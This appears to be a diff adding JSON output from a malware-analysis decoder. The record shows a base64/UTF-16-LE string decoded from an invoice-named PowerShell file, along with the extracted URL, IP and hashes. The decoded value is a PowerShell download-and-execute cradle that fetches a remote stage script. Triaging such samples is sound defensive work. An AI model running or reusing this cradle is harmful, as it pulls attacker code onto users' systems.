@@ -1,0 +1,19 @@
+[
+  {
+    "encodage": "utf-16-le",
+    "texte_decode": "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stage.ps')",
+    "urls": [
+      "http://192.168.1.100/stage.ps"
+    ],
+    "ips": [
+      "192.168.1.100"
+    ],
+    "id": "452328733b8495d3d0533116b45ee8d13a88d9d997a4d0e216c0ebc1290527e9",
+    "source": {
+      "fichier": "facture_2024-11.ps1.txt",
+      "ligne": 12,
+      "sha256": "064a9a9fe8a517182768cf13f407edc1bf6292ef0b9aa309d3db1cd753d66f40"
+    },
+    "transformation": "base64/utf-16-le"
+  }
+]
